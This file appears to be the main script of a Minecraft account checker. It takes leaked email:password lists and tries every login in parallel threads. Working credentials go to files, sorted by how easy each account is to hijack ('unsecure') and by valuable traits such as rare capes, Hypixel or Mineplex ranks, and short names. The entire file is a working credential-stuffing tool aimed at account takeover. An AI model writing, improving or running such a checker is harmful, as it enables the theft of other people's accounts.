from stuff.account_checker import *
from stuff.cape_checker import *
from stuff.special_checker import *
from stuff.file_creator import *
from stuff.config_reader import *
from multiprocessing.dummy import Pool as ThreadPool
create_files()
account_file_lines = open(BASIC_PATH + os.sep + 'accounts.txt').read().split('\n')
threads = Checker.Threads.thread_amount


class Counter:
    valid = 0
    invalid = 0
    insecure = 0
    minecon = 0
    fivezig = 0
    optifine = 0
    labymod = 0
    liquidbounce = 0
    hypixelrank = 0
    hypixellevel = 0
    shortname = 0
    mineplexrank = 0


def check(x):
    if not account_file_lines[x].__contains__(':'):
        pass
    email_username = account_file_lines[x].split(':', 1)[0]
    password = account_file_lines[x].split(':', 1)[1]
    answer = account_login(email_username=email_username, password=password)

    if not str(answer).__contains__('Invalid credentials'):
        uuid = answer["availableProfiles"][0]["id"]
        username = answer["availableProfiles"][0]["name"]
        unsecure = minecon = fivezig = optifine = \
            labymod = liquidbounce = hypixelrank = \
            hypixellevel = mineplexrank = shortname = ''
        open(FOLDER_PATH + os.sep + 'working.txt', 'a').write(account_file_lines[x] + "\n")
        Counter.valid += 1

        if Checker.Level.hypixel_level or Checker.Rank.hypixel_rank:
            hp = hypixel_check_api(username)
            if Checker.Rank.hypixel_rank:
                if hp[0] != 'False':
                    open(FOLDER_PATH + os.sep + 'hypixelRank.txt', 'a').write(
                        account_file_lines[x] + ' Rank: ' + hp[0] + "\n")
                    Counter.hypixelrank += 1
                    hypixelrank = '\n' + ' Hypixelrank: ' + hp[0]
            if Checker.Level.hypixel_level:
                if int(hp[1]) >= Checker.Level.hypixel_min_level and hp[1] != 0:
                    open(FOLDER_PATH + os.sep + 'hypixelLevel.txt', 'a').write(
                        account_file_lines[x] + ' Level: ' + str(hp[1]) + "\n")
                    Counter.hypixellevel += 1
                    hypixellevel = '\n' + ' Hypixellevel: ' + str(hp[1])
        if Checker.Rank.mineplex_rank:
            mp_rank = mineplex_rank_check(username)
            if mp_rank is not False:
                open(FOLDER_PATH + os.sep + 'mineplexRank.txt', 'a').write(
                    account_file_lines[x] + ' Rank: ' + str(mp_rank) + "\n")
                Counter.mineplexrank += 1
                mineplexrank = '\n' + ' Mineplexrank: ' + str(mp_rank)
        if bool(answer["user"]["secured"]) is False:
            open(FOLDER_PATH + os.sep + 'unsecure.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.insecure += 1
            unsecure = '\n' + 'Unsecure'
        if Checker.Cape.minecon:
            if minecon_cape_request(uuid) is True:
                open(FOLDER_PATH + os.sep + 'minecon.txt', 'a').write(account_file_lines[x] + "\n")
                Counter.minecon += 1
                minecon = '\n' + ' Minecon cape'
        if Checker.Cape.fivezig:
            if five_zig_cape_request(uuid) is True:
                open(FOLDER_PATH + os.sep + '5zig.txt', 'a').write(account_file_lines[x] + "\n")
                Counter.fivezig += 1
                fivezig = '\n' + ' 5zig cape'
        if Checker.Cape.optifine:
            if optifine_cape_request(username) is True:
                open(FOLDER_PATH + os.sep + 'optifine.txt', 'a').write(account_file_lines[x] + "\n")
                Counter.optifine += 1
                optifine = '\n' + ' optifine cape'
        if Checker.Cape.labymod:
            if laby_mod_cape_request(uuid) is True:
                open(FOLDER_PATH + os.sep + 'labymod.txt', 'a').write(account_file_lines[x] + "\n")
                Counter.labymod += 1
                labymod = '\n' + ' labymod cape'
        if Checker.Cape.liquidbounce:
            if liquidbounce_cape_request(uuid) is True:
                open(FOLDER_PATH + os.sep + 'liquidbounce.txt', 'a').write(account_file_lines[x] + "\n")
                Counter.liquidbounce += 1
                liquidbounce = '\n' + ' LiquidBounce cape'
        if under_four_character_long(username) is True:
            open(FOLDER_PATH + os.sep + 'special_name.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.shortname += 1
            shortname = '\n' + ' Short name'

        print('Valid account ' + username + '\n' + unsecure + minecon + fivezig + optifine + labymod + liquidbounce
              + hypixelrank + hypixellevel + mineplexrank + shortname
              + '\n' + '---' * 6 + '\n')
    else:
        print('Invalid Account' + '\n' + '---' * 6 + '\n')
        Counter.invalid += 1

def theads_two(numbers, threads=1):
    pool = ThreadPool(threads)
    results = pool.map(check, numbers)
    pool.close()
    pool.join()
    return results

if __name__ == "__main__":
    countt = []
    for x in range(len(account_file_lines)):
        countt.append(int(x))

    threads_one = theads_two(countt, threads)

Counter_list = [str(Counter.valid) + ' Valid accounts',str(Counter.invalid) + ' Invalid accounts',
             str(Counter.insecure) + ' Unsecure accounts',str(Counter.minecon) + ' Minecon-capes',
             str(Counter.fivezig) + ' 5zig-capes',str(Counter.optifine) + ' Optifine-capes',
             str(Counter.labymod) + ' Labymod-capes',str(Counter.liquidbounce) + ' LiquidBounce-capes',
             str(Counter.hypixelrank) + ' Hypixel-Rank accounts',str(Counter.hypixellevel) + ' Hypixel-Level accounts',
             str(Counter.mineplexrank) + ' Mineplex-Rank accounts',str(Counter.shortname) + ' Short-name accounts']

print('\n\nResult:\n')

for x in range(len(Counter_list) - 0):
    print(Counter_list[x])

print('Finished')
input()